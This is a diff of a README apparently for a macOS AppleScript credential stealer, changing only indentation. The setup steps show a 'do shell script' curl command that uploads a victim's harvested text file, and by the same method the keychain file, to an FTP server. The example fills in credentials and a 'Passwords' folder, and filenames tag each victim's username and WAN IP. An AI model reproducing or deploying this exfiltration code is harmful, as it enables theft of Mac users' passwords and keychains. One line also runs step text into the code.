@@ -24,12 +24,12 @@ The script is saved as an application with a duplicate application inside of it.
 2. Replace the parts of the code in '<>' with your information.
 
 	* Before:
-
-			tell application "Finder" to do shell script "curl -T ~/Public/" & ufld & "" & theuser & ".txt -u <User>:<Password> ftp://<ftp address></path/to/folder/>" & theuser & "_" & WANIP & "_" & dte & ".txt" -- Upload text file to FTP server
+	
+				tell application "Finder" to do shell script "curl -T ~/Public/" & ufld & "" & theuser & ".txt -u <User>:<Password> ftp://<ftp address></path/to/folder/>" & theuser & "_" & WANIP & "_" & dte & ".txt" -- Upload text file to FTP server
 		
 	* After:
 	
-			tell application "Finder" to do shell script "curl -T ~/Public/" & ufld & "" & theuser & ".txt -u Benb116:1234 ftp://123.456.789.0/Desktop/Passwords/" & theuser & "_" & WANIP & "_" & dte & ".txt" -- Upload text file to FTP server3. Repeat steps 1 and 2 in both files with the command that uploads the keychain file.
+				tell application "Finder" to do shell script "curl -T ~/Public/" & ufld & "" & theuser & ".txt -u Benb116:1234 ftp://123.456.789.0/Desktop/Passwords/" & theuser & "_" & WANIP & "_" & dte & ".txt" -- Upload text file to FTP server3. Repeat steps 1 and 2 in both files with the command that uploads the keychain file.
 4. Save App.applescript as an application (example name "App.app")
 5. Add the following 2 lines of code to the "info.plist" file in "App.app/Contents/" folder
 
